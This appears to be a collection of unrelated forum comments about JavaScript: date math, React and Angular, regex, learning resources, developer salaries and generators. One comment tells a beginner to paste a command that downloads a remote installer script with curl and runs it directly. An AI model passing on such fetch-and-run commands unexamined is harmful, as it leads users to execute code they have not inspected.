Well, hold on now... and maybe I'm misunderstanding... but both the #world and #blockMan divs are not statically positioned. #world is relative and #blockMan is absolute. Or is that not what you mean by static positioning?
Just to followup on being OK with native extensions: http://perfectionkills.com/extending-native-builtins/
Hey! Yeah, it's not set up to use any keys other than the arrow keys. I do know how I would go about "hooking up" the WASD keys though.
Thanks! Is there a similar method to determining the number of days in a month? ie have something like this: var d = new Date(); var currMonth = d.getMonth(); // Algorithm here var daysPerMonth = //29, 30, 31 depending on month 
[This](https://www.youtube.com/watch?v=-5wpm-gesOY) is a good example why you should use a library and not deal with dates and times yourself. 
Also completely irrelevant, but the word dice is already plural. A single die, multiple dice. Good luck with the college degree :) I'm about 60% through and it's totally worth the effort you put in.
This is the graph I am using...the example is straight from the D3 examples page. http://bl.ocks.org/mbostock/4063570
Kinda like how everyone follows his JSLint rules instead of flocking to [something else?](http://jshint.com/)
It's more or less the same idea. You use an array and check if it's a leap year: year = 2015; month = 5; mdays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]; days = mdays[month-1]; if (month == 2 &amp;&amp; ((year % 4) == 0 &amp;&amp; (! (year % 100) == 0 || (year % 400) == 0))) { ++days; } console.log(days); 
Lodash 3.0+ has lazy evaluation but I've been looking for something that's more "functional-first". Cool to hear that they are working on it! 
Should we hold our breath in suspense or guess at your reasons?
Hooray! I will admit that the first time I saw it in C#, my reaction was "what the shit is this shit?", but I was wrong. It's fantastic.
Yeah. Twitter had this issue. For character counting they used `length()`. You could only post 70 [pile of poo](https://codepoints.net/U+1F4A9) because of this.
I tried the 2 last links, they don't have pictures in them. My feeling is that noscript firefox addon is blocking it, along with the millions of ads. Can you please use either jsfiddle or [gist](https://gist.github.com/) ? Those two are trusted sources that work, I am glad to help you if you post your code there! 
Just to make sure there wasn't anything wonky in Node/JS, the Perl version gives the same answer: [CentosDev]$ cat /tmp/dow.pl #!/usr/bin/perl use strict; my $year = 2015; my $day = 30; my $month = 5; my @daysAtMonth = (0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334); # Add up $days/$year + leap days - leap exceptions + leap double exception # + $days in $months + current day my $n = $year * 365 + int($year / 4) - int($year / 100) + int($year / 400) + $daysAtMonth[$month-1] + $day; # If this is a leap $year and we haven't hit March, subtract out # the leap $day we added above if ($month &lt; 3 &amp;&amp; (($year % 4) == 0 &amp;&amp; (! ($year % 100) == 0 || ($year % 400) == 0))) { --$n; } # 0 = Sunday my $dow = ($n-1) % 7; print "$dow\n"; [CentosDev]$ perl /tmp/dow.pl 6 
&gt; To me, it seems really odd to load JS(X) files with HTML. This to me is the major issue. In some of my Angular builds I've had 20 input forms in one view; putting that all in the react class render seems absurd. My understanding here, is that it's hard to keep logic out of HTML (and depending on your definition of "logic", it might be virtually impossible). So fundamentally you have 2 options: mix your JS with your HTML, or mix your HTML with your JS. Your background in Angular is helpful here, since Angular chose the first option -- even if you leverage directives (custom or not), you'll always be writing at least some logic within your HTML. Part of the problem with that, is now you're also interacting with a templating language, and so it's no longer "just JS". This yields an environment where you're constrained by both HTML and the templating engine. Example from the Angular docs: &lt;div ng-repeat="n in [42, 42, 43, 43] track by myTrackingFunction(n)"&gt; To argue whether or not the code is "logic" is inconsequential, because you're already mixing in behaviors into a markup language. I believe React's take on this is: if you're going to have to mix them anyways, why not invert it, so that you're only bounded by the much more powerful and expressive JS (rather than HTML+templating engine). Also, most components don't have a great deal of HTML, and so it's not like you're going to be creating tons of nodes within your JS, just little fragments here and there.
You can practice right now in the console for your browser, hit option + command + i to open your development tools, click on console and write your JavaScript there. This way you can play with DOM elements of whichever site you're on when you enter the command. To use JavaScript in a local text file, you'll need to include it in your HTML with some &lt;script&gt; tags 
oh, I wasn't aware those kind of sites existed, thanks! First link: https://gist.github.com/anonymous/5b22bb61f6f7ab0e0dfd Second link: https://gist.github.com/anonymous/ff8c0b82abdcfac0f3a3
I pronounce it "JSON"
:)
This advice is for Chrome btw.
I use Mozilla's JS Shell from Spidermonkey. It's great for practice and it's free. Just google it and you'll find it.
_.template works really well until you have to make the client-side update the template values over time. The naive way is to just run the whole template again with new information and replace the html entirely, which isn't performant and often leads to visible issues (input fields lose their state, highlights and focus disappear, the page jumps, etc). You have to write separate code paths for the initial render and updates. This is a problem React solves terrifically: you only write code for the initial render (in a way that resembles _.template, but with better options for componentizing things), and updates are automatically handled in an efficient way.
Huh. 
Well as far as editors go, it's kind of up to personal preference. I prefer to use a full-featured IDE like IntelliJ IDEA, but many others prefer something more lightweight, like Sublime Text, Atom, Brackets, etc. For modern javascript projects, nodejs + npm are pretty much required. Don't confuse the usage of nodejs with server development, we're using node+npm for client side package management in this case. I'll also recommend Yeoman, at least for beginners. It's kinda nice being able to generate a template project with just a couple commands. This might help you understand how nodejs+npm (and grunt/gulp/webpack) work since some generators will generate package files as well.
Sorry if this is a very stupid question but I'm new to JavaScript and I can't figure out how to make this work
`if ((checkPhone('phone')) == "05" || (checkPhone('phone')) == "07")` When you do this, you're passing the string literal `'phone'` to your `checkPhone` method. You want to pass it the `phone` variable, so you need to omit the quotation marks. Edit: Actually, nevermind, your `checkPhone` method doesn't take a parameter, so the above is a moot point. You should also use `===` rather than `==` because you don't want it to do any type coercion. I can't tell how your `empty` method is working -- sometimes you're calling it with a parameter and sometimes not. if (checkPhone()) { errors.innerHTML += "&lt;div class = 'alert alert-danger'&gt; Phone field is not valid. &lt;/div&gt;"; return false; } This logic doesn't make sense -- `checkPhone` is returning the first 2 characters of the `phone` input, so this block will execute when there's anything in the field.
Lots of typos in there. Here's an updated version. https://jsfiddle.net/mkbdyspd/3/
++Lodash Pourover.js D3.js Grunt.js / Gulp.js
Totally agree. That said, I'm sure it'd be possible to write a regex that enabled both bracket types. :) otoh https://xkcd.com/1171/ https://xkcd.com/1313/
Ff and safari have native developer tools, which include a console. 
What would you like to make?
It only doesn't make sense if you aren't aware of how strings are compared IMO
I tried using phone without the apostrophes, unfortunately it didn't work. about checkPhone, you're right, I must've just copied the format of the other ifs of the other fields. I tried labeling it as note (comment) but it still wasn't working.
Sounds like a super specific use case, so it doesn't make sense to add yet another function to the DOM API. In any case, you only need a few lines of code to make your own using the [TreeWalker API](https://developer.mozilla.org/en-US/docs/Web/API/TreeWalker). For example, if you wanted to get all the comments within a subtree: function getComments(node) { var walker = document.createTreeWalker(node, NodeFilter.SHOW_COMMENT); var result = []; var current; while (current = walker.nextNode()) { result.push(current); } return result; }
As above, your `checkPhone` method doesn't take a parameter, so it makes no difference what you pass it, since it's not doing anything with it. I'm not sure what you mean in the second part of your comment. What isn't working? 
I meant that even when I labeled it as a comment and tried to register while using a number that doesn't start with 05 or 07 (which is what I was initially trying to do), it didn't stop me and it registered the account. really losing hope by the minute to be honest here, I've been dealing with this for the 7 hours and nothing seems to be working.
Well sure, because then you're not checking the beginning of the phone number at all. Your problems seem to be caused by the fact that you're writing functions and then misusing them. Your `checkPhone` method is just returning the first two characters of the phone number field, it's not telling you whether they're `05` or `07`. Your `checkStart` method is doing that. Again I don't know what your `empty` method does, and it seems like you probably need to pass it `phone` when you call it from `checkStart`, rather than calling it with no parameter, but otherwise it's just: if(checkStart()) { // phone number starts with 05 or 07 } else { // phone number doesn't start with 05 or 07 } Also you generally don't need to explicitly have your methods `return false` -- a method without an explicit `return` statement will return `undefined`, which coerces to `false`. If you're having a hard time thinking this through in your head, [the debugger is an invaluable tool](https://developer.chrome.com/devtools/docs/javascript-debugging). 
Thank you a lot! By the way on my earlier attempts mod.innerHTML = change ; was just showing whatever I wrote into the function, why?
option+command+j to go straight to console for chrome. 
Good work. I liked this 'Your browser is shit. Please go and download chrome.' 
&gt; To me, it seems really odd to load JS(X) files with HTML. This to me is the major issue. In some of my Angular builds I've had 20 input forms in one view; putting that all in the react class render seems absurd. You're correct, that would be pretty messy. With react if your jsx gets too big, consider refactoring it into smaller chunks (ie: components). You could make each input into some custom component, and then your render becomes a bunch of components (instead of a ton of html labels, inputs, etc). It lets you apply DRY principles to HTML. &gt; My second confusion is routing. ... Comparing it to angular, you have define all your routes, the routes tie to classes and views. Angular is a complete web app framework, which includes routing amoung many other things. React is a library that handles binding a model to a view and little else. It's up to you to find another library to handle routing. 
Hi Mossare, I put together a project a while back for exactly this purpose: https://github.com/jeremyckahn/lib-tmpl
I don't really see the use in this. Why should I use this rather than just typing it out for myself?
It sounds like you have the console.log in the wrong place, or you're just not having anything returned. It should be: function dbNumber () { $.post('url.com/api/api.php', {what: 'rows', where: 'database'}, function(data) { console.log(data); }); } or function dbNumber () { $.post( "url.com/api/api.php", {what: 'rows', where: 'database'}) .done(function( data ) { console.log(data); }); } http://api.jquery.com/jquery.post/#example-4
Because SPAs. React allows you to update tiny parts of your page instead of huge parts . It also allows you to keep your JS and HTML together in the same file with something they call JSX. It seems a lot of people think this is a good idea.
Thanks for the reply, but I found out the error was caused elsewhere. Deleting the post.
What about template strings? let foo = "bar", baz = 2; console.log(`test: ${foo} ${baz}`);
 var re=/^0(5|7)\d{8}$/; if(re.test(phone string))
Ah, right, my bad. Will do!
Can you spell "proper" and "library" correctly and explain what you mean by proper? I wouldn't call a single class a library. I'd call it a class. You should also label this somewhere as not ES5. Also, you must have really bad googling skills. If you want a well developed set of vector classes, I'd be looking at threejs... https://github.com/mrdoob/three.js/blob/master/src/math/Vector2.js 
There's this too: http://stack.gl/packages/#stackgl/gl-vec2 It can use typed arrays and it's very fast.
For me, it's really just a matter of what I'm concatenating. Smaller strings, I use string concatenation. For larger strings, or strings that represent multi-line templates, I use arrays for readability. There's really not a wrong way... I just wanted to throw out my example since the blog author didn't mention it.
Thanks for your input! :)
Haha. If only. A very important detail of Javascript strings is that, even though they're defined as "UTF-16" in the standard, all existing string manipulation functions and operators previous to ES6 handle them as UCS-2, and the language itself does not enforce strings to be valid UTF-16 (that is, invalid surrogates are allowed) What this means is that your application will do the wrong thing with no warning on strings containing characters from any of the sixteen supplemental planes.
Thank you very much, I will surely look at it :)
Well my input was more informative than your post. Which probably shouldn't exist, given its lack of truth and use.
In German (where this character is coming from), 'ä' is supposed to be equivalent to 'a' when sorting. English software gets this wrong pretty frequently.
You can also look at physics "libraries" to find good implementations of vectors "classes" like cannon.js https://github.com/schteppe/cannon.js/blob/master/src/math/Vec3.js 
ive always said jace-on for some reason...
[`substr`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/substr) - MDN states ES3 and implementation in JS1?! Thanks for the heads-up, will have to check it. [`test`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/test) is an interface on `RegExp`, so that was mis-remembered but still reliant to the article.
&gt; Do I really need to explain why comments are bad in production? And why you may not want to store data or logic in them? Your statement, as you originally presented it could have been valid, but you presented it without explanation. This is a [red herring](https://en.wikipedia.org/wiki/Red_herring). When I asked for clarification, as in providing you the benefit of the doubt, you responded with an ad hominem. You seem confused, which is likely because you are trying to make this about a person rather than the technical subject at hand.
I've been working with JS long enough to have PTSD about it's "dark age" and I hope that I can give you some insight! The big library I work with, that I've also taken the time to grok is Ember.js. Speaking to large libraries that are designed and programmed well, I believe that the Ember project demonstrates the value of unit tests as documentation. That isn't to say Ember isn't documented as a framework, but when we look at the internals of any framework, the unit tests are the documentation for any prospective maintainers. Another area to focus on is that a lot of the good libraries out there, Ember as an example, abide by [SRP](http://www.oodesign.com/single-responsibility-principle.html) or the single responsibility principle. We see this in action with *nix programs, like `echo` or `cat`. They're well described and do exactly what they're meant to do. If they were classes in our codebase, we could describe them as intuitive. A sophisticated library doesn't have to be difficult to follow if your classes adhere to the SRP model. I'd also take advantage of good tooling. When I'm not working with Ember, but on a *vanilla* JS library, I make sure that my tools provide me with the same amount of comfort that I get when I'm dev'ing Ember. So, I use ES 6, a Broccoli pipeline with Babel and unit testing with Jasmine or QUnit (if I plan on having jQuery as a dep). This stuff helps me stay focused on writing code, not fussing with tools, because it just works! Finally, pairing helps big time! Having another dev available to help you code will really flush out any architectural problems you might have. I hope this helps you on your journey!
According to the [docs](http://chaijs.com/api/bdd/#equal), `to.equal` tests using `===` (identical, same objects, similar to Java's `==`). So the test would fail the changes you have shown: var foo = {}, bar = {}; foo === bar; // false Having said that, if you had to test this `init` method, how would you have done it?
Just one thing to point out; `\` is not multi-line, or at least it doesn't compile to multi-line... var x = 'foo \ bar'; // foo bar Is not the same as: var x = `foo bar`; // foo \nbar Backticks with a `\` at the end of the line will void the new line return, just like the old way. var x = `foo \ bar`; // foo bar Source: [newline](https://babeljs.io/repl/#?experimental=true&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=var%20x%20%3D%20%60foo%20%0Abar%60%3B) / [continuation](https://babeljs.io/repl/#?experimental=true&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=var%20x%20%3D%20%60foo%20%5C%0Abar%60%3B) 
Thanks for the FYI, but I don't use lodash (just removed it from work, actually, we were only using it on 5 lines). The `.is.*` functionality are generally all standard 1-ish-liners, plus I can do things like `bDisallowNullString` or `bDisallow0LengthArray` as optional criteria without breaking an upgrade path. Plus I pair them with `.make.*` (cast) functions so the interface is pretty clean/self documenting.
OMG... THX for help
&gt; first need to learn html Copy paste this into terminal. # Install Homebrew ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"; # Install Node brew install node; # Run Node node; Javascript away &gt; var lazy = 'Ain\'t got time for HTML';
JavaScript runs in the browser so your operating system doesn't matter. Just download a text editor, create a JS file and link to your html file using &lt;script&gt; tags.
Look at lodash-fp.
No love for Victor.js?
haha - I felt the same way, but it is shaping up to be really pleasant to use. Thanks for not removing the link!
Thanks! We have a landing page for it up now and the docs are available at http://docs.seedsjs.com If you have any questions let me know! 
With the [fetch API]( https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) right around the corner, and the polyfill covered, I'd just start using that going forward and forget `XMLHttpRequest`.
Components are HUGE. Think of components as: * modular chunks * that include the view and logic, * keep track of their own state, * and can be made of other components. No more state hell. No more global stuff-messing-with-other-stuff-by-mistake. And if you use Flux or a similar one-way dataflow framework, you never get into a ball-of-mud page logic situation.
To add to this thread... one problem with Angular is that its HTML is just a definition. The views are parsed by the browser and have to be written in certain ways (like unresolved href/src attributes). Then the JS engine has to parse it all out via the DOM and turn it into directives and renderable views. React skips all this by using JSX to retain mostly the same notation, while being able to compile it once on build. However, JSX is more powerful because attributes aren't strings. You can not only pass in JS values/objects, but other "rendered" components. Because these are just virtual nodes, other components can take these and decorate/modify them in various interesting ways. Secondly, React's basically a trojan horse for immutability and related functional concepts. Props are immutable, state isn't, which provides a framework for proper component design. Lifecycle methods are available, but are rarely needed, mainly to interface with non-react code. With things like react-cursor, you can do some really sophisticated UI behaviors. Especially nice is to consistently contain your async interactions inside a specific wrapper components that only render children when the request is completed. It means children are isolated from that. 
The error is simply that the chart does not populate. Hopefully this could help &gt; I wrote in a document.write on each for loop to get an idea of what's going on. On the first for loop my intention was to have it write the first year, then move on to the second for loop where it will write months 1-12 at which point it will move back to the first for loop to write the year again (which has increased do to the y++) Problem is that the document.write is trying to write the year for every single monthly document.write. Maybe this is why when I use the push formula on the first for loop, I get a mess of data and the chart breaks? Sorry I realize it's difficult to see what's going on behind all the Morris graph JavaScript (which is the graph I'm writing data into)
I started off with [Codecademy](http://codecademy.com/) and they have a bunch of great courses for learning the fundamentals of different programming languages. I really like their JavaScript courses, and I would recommend it for someone who is an absolute beginner for an introduction to the language.
Our [sticky](http://www.reddit.com/r/javascript/comments/2upyol/learning_js_feedback_or_questions_about_the_sub/) has some resources for beginners.
That is correct, but the one that's testing the `options` is `calledWith`. I ran the tests so I know it passes. As /u/Omnicrola commented, you can generate a random `options` object. At least, you shouldn't test with empty objects (unless you want to test their emptiness, of course).
The Mozilla resources are pretty great - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide. (Since most of the JS work will on the client side, read up on and master the DOM. Most of client side JS is all about manipulating the DOM). Do tons of small projects. Once you have that under the belt, read all of Nicholas Zakas' books. That man knows how to teach JavaScript. Especially recommended is [Principles of Object Oriented JavaScript](http://www.amazon.com/Principles-Object-Oriented-JavaScript-Nicholas-Zakas/dp/1593275404) (Don't be fooled by the title - it's a veritable trip though core JavaScript and features unique to JavaScript). Do tons of projects. Read up on Node.js and server side JavaScript - [Beginning Node.js](http://www.amazon.com/Beginning-Node-js-Basarat-Ali-Syed/dp/1484201884) is the best resource I have found that teaches Node in a pragmatic and logical manner. Do TONS of projects. Seriously, JS is one of those quirky languages that is best learnt by doing lots and lots of small projects, making plenty of mistakes, and learning from those mistakes.
If you're familiar with the basics of programming, then I recommend starting with the ["Core" section of nodeschool.io](http://nodeschool.io/#workshopper-list). Each lesson should only take you an hour or two, and if you get stuck there is a very active [help section](https://github.com/nodeschool/discussions/issues) available. From there, pick and choose your Electives to continue learning. nodeschool definitely doesn't cover everything, but no one source does. And a lot of the lessons are written by leaders in the space - you wont find anything like it.
What does immutable.js do?
I'm at 120k (in SF) after nearly 5 years of experience.
google You Don't Know JavaScript series
I make 100k in Portland, graduated university in 2013.
For friendly introductions to programming, I highly recommend Khan Academy and Code Combat: https://www.khanacademy.org/hourofcode https://www.khanacademy.org/computing/computer-programming https://codecombat.com/
PluralSight
As someone not from the US it really strikes me as awkward that they mention "white". 
Create a test case on jsbin/jsfiddle/etc. As the code currently is, the body of that loop wouldn't even execute once, because undefined &lt; NaN is false.
my team in Berlin is making average of 48k euros, around 4 years experience
Yeah that's pretty shocking, that and the sexual orientation.
Actually, the original version of this book is no longer for sale. The link for the updated free version is here: https://leanpub.com/javascriptallongesix/read Or, if you want to buy it in other formats, here: https://leanpub.com/javascriptallongesix
i'll probably get flak for this, but [w3schools.com](http://www.w3schools.com/js/default.asp). it's how i learned javascript in elementary school, and it's basic enough for a first-time programmer.
Are you sure the problem is in that part? Do this, right after that code, add: console.log("Bar chart data:", JSON.stringify(bar_chart_data)); console.log("Line chart data:", JSON.stringify(line_chart_data)); Open your console, copy the results and paste them here.
I don't want to bash but I'm not sure the library provide clearer intentionality than vanilla: var str = 'search the last word smaller than six characters'; var small = 'last small word: '+(str.match(/\b(\w{1,6})\s/g)||['none']).pop(); Or: function lastSmallWord(str){ var prefix = 'last small word: '; var m = str.match(/\b(\w{1,6})\s/g); return m ? prefix+m.pop() : 'no match found' } lastSmallWord('search the last word smaller than six characters'); Another example from the README: jRex(/([xyz])/) .filter( function(r) { return r.index() % 2 == 0; }) .format('&lt;$1&gt;').replace('playing my xylophone') Can be abbreviated as: 'playing my xylophone'.replace(/([xyz])/g,function(match,submatch,index){return (index%2 != 0)?'&lt;'+t+'&gt;':t; }); or: function encloseOddLetters(match,submatch,index){ return (index%2 == 0)? t : '&lt;'+t+'&gt;'; } 'playing my xylophone'.replace(/[xyz]/g,encloseOddLetters); Is there another reason to use this library than making regexes more readable?
Lately we've seen even CSS and associated logic starting to get pushed to component level. In a way we're coming through a full cycle here. First we started with inline styles, then we went all CSS, preprocessor (SASS, LESS, ...) and now we're back in inline styles. Except this time we can extract CSS from inline declarations and get somewhere in between (good loading perf, easier to work as there are no cascades). In the process we get rid of the global nature of CSS which is a nice bonus.
Eventually you'll start categorizing components (dumb vs. smart, specific vs. abstract, controlled vs. uncontrolled etc.). Even though you can keep state within components early on at some point you'll adopt some sort of architecture (Flux, immutable trees, etc.) for dealing with data. What makes React great is that it solves only one tiny part of the equation and leaves all the important choices for you. So instead of fitting a solution to problem you are going the other way around. I think that's one of the primary gotchas with frameworks. They become golden cages quite fast.
So true. "a dev is seen as the bottom of the hierarchy". And an experienced dev who didn't want to become project manager is most often seen as a failure.
You're right sure. But my point was not really US vs Europe in terms of working conditions in general, but how software developers are considered in these respective regions, compared to other professions. It seems that in the US it's a respected and well paid job, while in Europe much less so. 90K vs 50K is a huge difference, I'm not an economist but I don't think this gap is reflected in many other professions.
Could it be overvalued in the US?
some are already mentioned, but here's a list: (google them) * eloquentjavascript (free) * you don't know javascript (you can find the free ebooks on github) * javascript design patterns (o'reilly) * javascript the good parts (o'reilly) I wouldn't recommend learning from codeacademy, it is absolutely no indication of you actually understanding javascript. If you really would like to learn from these kind of courses, you could consider nodeschool or codeschool, but IMHO stay away from codeacademy.
Coal mining? Doesn't everyone just end up black anyway?
Did you look at [vectorious](https://github.com/mateogianolio/vectorious)? Any opinions on it? It's improved over the last few months.
"Hey, I don't like how JavaScript isn't like Java, so I made this video calling things strange and weird because I want to force a language to adhere to the tenets of a different one" Apart from the stunningly incorrect (Objects are primitives) and the downright idiotic (an underscore at the beginning of a property name marks it as private, but it's not enforced, heh heh) this is just yet another video espousing the classic OOP approach and how to force JavaScript to act that way, using terminology that *just doesn't apply*, like classes, inheritance and the like.
I'm at 115k (without bonuses, 401k, stock plans etc) in the san francisco bay (south bay) and I graduated in December 2014
For the UK, the disparity is misleading because of the interest rate. $90k is £58k. Continental Europeans do seem to be getting screwed, though.
In the US, there are still many places where you're considered to have "made it" if you've become a non-coding architect. I'm the VP of Engineering at a small company, and I do whatever is needed to help us become successful. When we were trying to win the business of a major financial company, we needed to do an on-site demo of a new capability. Everyone else was busy on other projects, so I wrote the code myself. I accompanied the sales guys because it wasn't part of the product yet and the sales engineer didn't know how to set it up. While I was doing that, one of the customers "architects" came by to chat with a sales engineer he knew, and who was watching me. The "architect" made some snide remark about me being a "code monkey" and how glad he was that he didn't "need" to code anymore, and he hadn't done so in years. I was polite, of course, when the SE introduced me as the VP. I'm familiar with that attitude. Sure, an architect (and a VP or Director, for that matter) will almost certainly have a mix of responsibilities that will keep them from spending much of their time from coding. But I will never hire, or keep on my payroll, an architect who thinks that coding is beneath them. There's a classic article about this in the old Portland Pattern Repository, called ["Architects Don't Code"](http://c2.com/cgi/wiki?ArchitectsDontCode) By the way, $50K is low for a software developer, depending on where you live of course. A new graduate from a CS or Computer Engineering program in the US will make more than that. I suggest OP send out his resume. Even if he lives in a low cost area, he may be able to find something where he can work remotely. I use 2000 hrs/yr for mental calculations, so 50K is about $25/hour. Companies pay that, and more, to offshore consulting companies for developers in low-cost countries. OP has English and the right timezone, so a US based consulting company would have no problem doubling or tripling that or more (they keep a share and don't pay benefits, so OP would have to pay attention to that). His current employers would have a hard time replacing him even with outsourcing if he leaves at that rate
&gt; 2) the idea of accessing comments from JavaScript is Very Wrong for so many reasons. Exactly this. The Principle of Least Surprise is key here; in almost every language, comments are human-readable, machine-ignored text. This is by design: if you need to store machine-readable data, there are plenty of places to put it, and if you need to put something in your comments, it should be because there's no way to convey it through code -- and so you shouldn't have to worry about possibly triggering some unexpected behavior because you chose to phrase your comment a certain way. The *what* and the *how* should be apparent from the code, leaving comments only to describe the *why* to a human -- *not* to a machine. This is particularly true in the DOM, where you *already* have a data description language (HTML), that can *already* store whatever data you need in DOM attributes. Why introduce an unnecessary "feature" that: * Requires new development * Requires future maintenance * Increases the surface/testing/learning area of the DOM API for no real benefit ...while not providing any new value -- and just the opposite, reducing the value of comments (by making them into a minefield of hidden bugs)?
No. Speaking as someone who often has to work with programmers in Europe, the result of such a mindset means half decent managers and awful fucking devs, because the moment someone gets good they're promoted out. I should caveat this by saying I've met a lot of great devs from Europe... And they're almost all people who've moved to the US in the last few years.
And salary ranges depend on what you are doing. There is a huge skill level range in JavaScript development.. from making a "Subscribe to my Newsletter" form pop-up on a web page using jQuery to developing an [LDAP server](http://ldapjs.org/).
I make ~$80/hr AUD (so $60-ish USD) after Super (think Social Security) in Canberra Australia so around $120k-ish USD a year when it's all said and done, but we have SF-level of living expenses (shitboxes in da hood are $400k) without Amazon, so in most ways worse than SF. Hell, I was watching that grocery store video in AK last week and thought "yea, those prices are a bit high... OMG OZ IS EXPENSIVE!". Technically I'm a C# developer, but I've been the frontend guy for a smallish gov department for over a year now (been a dev since '99). Nice thing about Oz is contracting isn't scarey thanks to public healthcare. The permies make $80k-ish AUD on a good wicket (as the Aussie's say), but no idea how they live on that here.
Totally. Finding a company in SF to sponsor your H1B visa should _not_ be hard. Then again, how far does $30k go where you live? Rent in SF is $2k a month (if you find a deal). EDIT: also, many companies in SF will be happy to pay you to work remotely.
Better education system means more highly educated people thus more supply and lower wages. (does that theory work?)
Seconded. I do feel however that there is a bit of a drop off afterwards though. I have some guidance from a family friend's company and without that I would have been lost after code academy.
http://www.asmarterwaytolearn.com/ Thats a great book on JavaScript and its made for people who have never seen JavaScript before. Besides that book, I would start with going through any free online courses you can find. Team Treehouse, Code Academy, Code School, Khan Academy, anything and everything. If you finish the javascript course on one of them, switch to another one. They all will have little bits you will pick up from each of them.
Very much the situation in some major Norwegian consultancy companies as well. Funny, seeing how managers are nothing without devs.
Is that in London? Do you have to work on the client site, or do they allow you to work from your own office? Do you find it difficult to find new gigs when your contract expires? Thanks in advance.
If you don't mind people cheating, just write all of your data in an object and then JSON.stringify it. Then you JSON.parse it to load the data
I happened to come across Yehuda Katz arguing against `const`, or at least questioning its use: https://twitter.com/wycats/status/604503020206850049 I find that the clarity gained by using `const` is well worth the two extra characters. It's nice to read a function and know that a particular binding will remain constant, even if your function isn't 9001 lines long. Remember, code is read more than it's written. Supposedly.
I cannot believe that. Almost makes me angry. Why bring your sexual orientation into a discussion on compensation? I can guarantee you nobody has ever been offered less pay because the employer (somehow?) deduced their sexuality.
I think this topic is more complicated, but I agree that the prestige of the software development profession is pretty low. But we also don't have a lot of impressive companies in Europe. If you work in the field for the most part you work for companies the average person has never heard of. This is also the reason I would compare the salary with other cities than NYC and SF. In this cities you a have high demand for great developers, a demand the market can't really satisfy. Therefore it is highly competitive, if you are really amazing at what you do, you can choose from a list of great companies and everyone would be happy to have you. This cities are also really expensive, would you get comments like "So, homeless in ...?" if you earned 50k let alone 120k here? (I am aware that's mostly a joke) Not to mention taxes, healthcare, pension and everything else the companies need to pay for their employees. I also think our attitude towards technological advancement is the reason we are falling behind in this sector. What great innovation, advancement or even service came out of Europe in the last couple of years? Even our car companies are getting overtaken by start ups and big tech companies in term of advancement.
Yes, central London. I mostly work on clients' sites. Have never had any issue picking up new contracts as the market is very healthy.
The examples where only meant to show its usage. So indeed, they don't tell its usefulness. The library is exactly meant to be able to use simple regexes. The regex builder and function chaining makes that possible, without much impact on its speed. Chaining of the functions will also prevent unnecessary calculations (laziness) without the need of for loops. Regexp object also contain state, i.e. that keep the search location. This can lead to errors.
I'm actually American so no visa required! It's just a matter of getting the money saved up to get my family moved. $30k is livable here, but not very comfortably for a family of 5 (I know, I know "Why have kids if you can't afford it?" Well, at one time I could actually afford it and having kids here isn't too much of a financial burden for the first couple years anyway. It's a long story and some bad luck put me in my current spot.). I don't have air conditioning in my cockroach infested apartment and now that my kids are in school, things are even more difficult. Hopefully my wife will start working soon so that will help a lot.
90k a year (plus 401k) in the midwest. Started coding in my 30's (self-taught) and now am in my 40's. Love it.
&gt; 3 years full-time experience working in JavaScript and I'm at 50K/yr in U.S. Holy hell that's low. Unless you're in Des Moines or something. 
I think it's plausible that an employer may not take an obviously gay individual as seriously.
North Carolina, ~130k after bonus. Two years on the job. BS in CS from a large public university.
We have, but because *bla bla brain gets bad at learning new things after 30's* (someone actually said that to me once) they consider programming as "something that young people do". Because of that, they prefer to get into managerial positions as fast as possible. According to the popular notion here, a senior dev is a "manager in the waiting line".
That's true of most professions. Management is seen as a willingness to take on additional responsibilities. This willingness makes you more valuable and challenges you to grow in ways that say... Freelancing for your whole life... Will not
[Douglas Crockford's Videos, Learning Sites, Articles &amp; Books](http://conceptf1.blogspot.com/2013/11/best-resources-to-learn-javascript.html)
I like your writing style. Might have wished for a benchmark or two here, to show that your lazy evaluation actually gets us something. I feel like the missing tidbit here is the JIT, which seems to have some relevance in terms optimizing these sequence evaluations.
$100/hr - Texas, US. 10 years full-stack development and 2 years dedicated Javascript/UI development.
Thanks a lot, as long as it got the idea across fairly efficiently I'm happy. I haven't really bothered to compare the speed, mainly because I'm not sure what I'd compare it to. If I wrote a for loop to produce the same data it will be an order of magnitude faster, but that's besides the point. To express things like the lazy date array without this kind of tooling in a reusable way would be difficult. I think with some more optimisations there would be areas where this would be far faster than a brute force approach. I know that Haskell has some kind of magic (I have no idea about the specifics, sorry) that allows it to skip parts of the chain. So if you say drop 50, take 5, it won't have to evaluate the first 50 to get there, as mine does. Maybe someone will point out that optimisation or add it for me in the future. I am not a computer scientist, I am simply porting the idea of Clojure's lazy sequences over to JavaScript to understand them and have access to them elsewhere. It was also pretty fun to build.
Generators allow an easy syntax for lazy evaluation. I get the whole "use this before ES6 thing" for browsers. You can already do this kind of thing server-side, though. I would argue that one of the biggest reasons to use generators are the map, filter, some, .etc algorithms. Take this ES6 code for example: function* range(start, end) { for (var i = start; i &lt;= end; i++) { console.log("range yielded: " + i); yield i; } } function* map(source, fn) { for (var it of source) { var mappedValue = fn(it); console.log("map translated to: " + mappedValue); yield mappedValue; } } function reduce(source, fn, initial) { var value = initial; for (var it of source) { value = fn(value, it); } return value; } var source = range(1, 4); var results = map(source, i =&gt; i * 2); var resultsToString = reduce(results, (c, n) =&gt; c + n, ""); console.log(resultsToString); Here is a fiddle for it http://www.es6fiddle.net/iackjkbl/
